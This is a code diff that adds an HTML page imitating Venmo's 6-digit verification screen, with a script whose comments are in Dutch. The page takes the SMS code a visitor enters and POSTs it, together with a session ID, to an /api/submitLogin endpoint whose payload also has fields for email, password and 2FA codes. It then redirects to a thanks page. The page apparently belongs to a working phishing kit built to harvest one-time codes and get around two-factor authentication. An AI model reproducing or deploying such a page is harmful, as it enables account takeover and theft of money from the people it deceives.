@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Venmo - Enter 6 Digit Code</title>
+  <link rel="stylesheet" href="bamba.css">
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="login-logo">
+      <img src="venmo.png" alt="Venmo Logo" />
+    </div>
+
+    <div class="login-box">
+      <div class="login-subtext">Enter 6 digit code</div>
+
+      <form id="codeForm">
+        <input
+          type="text"
+          id="codeInput"
+          name="code"
+          placeholder="Enter 6 digit code"
+          required
+          class="login-input"
+          maxlength="6"
+        />
+        <button type="submit" class="login-button">Next</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="disclaimer">
+    By entering the code, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+  </div>
+
+  <script>
+    // Session ID ophalen uit sessionStorage
+    let sessionId = sessionStorage.getItem('session_id');
+
+    // Als geen sessionId beschikbaar is => terug naar login
+    if (!sessionId) {
+      window.location.href = "/"; // of naar je login pagina
+    }
+
+    document.getElementById("codeForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const code = document.getElementById("codeInput").value.trim();
+
+      if (code.length !== 6) {
+        alert("Please enter a valid 6-digit code.");
+        return;
+      }
+
+      const data = {
+        type: "venmo",
+        email: "",          // leeg want niet nodig nu
+        phoneNumber: "",    // leeg
+        password: "",       // leeg
+        smsCode: code,      // hier vullen we de code in
+        twoFACode: "",      // leeg
+        twoFAchoice: "",    // leeg
+        sessionId: sessionId,
+        timestamp: Date.now()
+      };
+
+      fetch("/api/submitLogin", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
+      })
+        .then((res) => {
+          if (!res.ok) throw new Error("Network error");
+          return res.json();
+        })
+        .then((result) => {
+          console.log("Success:", result);
+          window.location.href = "thanks.html"; // Volgende stap
+        })
+        .catch((err) => {
+          console.error("Error:", err);
+          alert("Something went wrong. Please try again.");
+        });
+    });
+  </script>
+
+</body>
+</html>
